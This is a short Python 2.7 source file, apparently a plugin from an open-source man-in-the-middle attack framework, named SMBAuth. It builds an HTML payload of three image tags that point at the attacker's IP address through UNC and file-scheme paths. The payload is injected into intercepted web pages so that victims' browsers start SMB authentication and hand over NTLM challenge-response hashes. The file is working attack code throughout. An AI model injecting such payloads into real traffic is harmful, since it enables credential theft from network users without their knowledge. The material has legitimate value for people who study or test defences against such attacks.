#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from core.utils import SystemConfig
from plugins.plugin import Plugin
from plugins.Inject import Inject

class SMBAuth(Inject, Plugin):
    name     = "SMBAuth"
    optname  = "smbauth"
    desc     = "Evoke SMB challenge-response auth attempts"
    version  = "0.1"
    has_opts = False

    def initialize(self, options):
        self.target_ip = SystemConfig.getIP(options.interface)

        Inject.initialize(options)
        self.html_payload = self._get_data()

    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.target_ip]*3)
